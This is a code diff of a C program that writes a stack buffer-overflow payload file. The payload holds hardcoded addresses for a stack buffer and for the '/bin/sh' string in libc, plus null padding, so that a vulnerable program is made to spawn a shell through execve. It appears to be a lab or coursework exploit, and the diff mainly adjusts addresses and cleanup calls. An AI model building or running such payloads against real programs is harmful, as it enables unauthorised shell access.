@@ -13,8 +13,8 @@ unsigned char* littleEndian(char *str, int numChars);
 
 //address of /bin/sh in libc
 #define BIN_SH_ADDR "0x7ffff7b99673"
-//#define BUFFER_ADDR "0x7fffffffdcb0"
-#define BUFFER_ADDR "0x7fffffffdc30"
+#define BUFFER_ADDR "0x7fffffffdcb0"
+//#define BUFFER_ADDR "0x7fffffffdc30" <- buff according to gdb
 
 
 int main(int argc, char *argv[]){
@@ -70,9 +70,6 @@ int main(int argc, char *argv[]){
   
   //write address of 'sh' in libc memory to file first
   fwrite(shAddr, sizeof(char), ADDR_SIZE, file);
-  for(i = 0; i < ADDR_SIZE; i++){
-    fwrite(shAddr+i, sizeof(char), 1, file);    
-  }
 
   //write 8 null characters to signify end of args for execve
   for(i = 0; i < ADDR_SIZE; i++){
@@ -92,15 +89,14 @@ int main(int argc, char *argv[]){
     j++;
   }
   
-  //fwrite(instructions, sizeof(char), fileSize, file);
-     
-  /* fill buffer */
 
   fwrite(addr, sizeof(char), ADDR_SIZE, file);
-  
+
+  free(shAddr);
   free(addr);
 
-  fclose(file); 
+  fclose(file);
+  fclose(instFp);
 }
 
 /*
